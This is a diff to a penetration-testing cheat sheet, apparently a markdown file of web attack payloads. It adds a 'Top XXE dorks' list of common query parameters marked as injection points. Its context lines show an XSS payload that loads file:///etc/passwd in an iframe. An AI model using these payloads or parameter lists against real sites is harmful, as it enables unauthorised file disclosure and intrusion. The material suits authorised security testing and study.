@@ -31,6 +31,7 @@
   - [PHP filter](#php-filters-for-lfi)
   - [Cross Side Scripting (XSS)](#xss-common-payloads)
       - [XSS to LFI](#xss-to-lfi)
+      - [Top XXE dorks](#top-xxe-dorks)
   - [XML External Entity (XXE)](#xxe-common-payloads)
       - [Exploitable Protocols](#exploitable-protocols)
   - [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
@@ -297,6 +298,34 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 `<script>` and `<iframe>` with `document.write`
 ```js
 <script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
+```
+### Top XXE dorks
+```
+?q={payload}
+?s={payload}
+?search={payload}
+?id={payload}
+?lang={payload}
+?keyword={payload}
+?query={payload}
+?page={payload}
+?keywords={payload}
+?year={payload}
+?view={payload}
+?email={payload}
+?type={payload}
+?name={payload}
+?p={payload}
+?month={payload}
+?immagine={payload}
+?list_type={payload}
+?url={payload}
+?terms={payload}
+?catagortid={payload}
+?key={payload}
+?l={payload}
+?begindate={payload}
+?enddate={payload}
 ```
 --------------------------------------------------------------------------------------------------------------
 # XXE common payloads
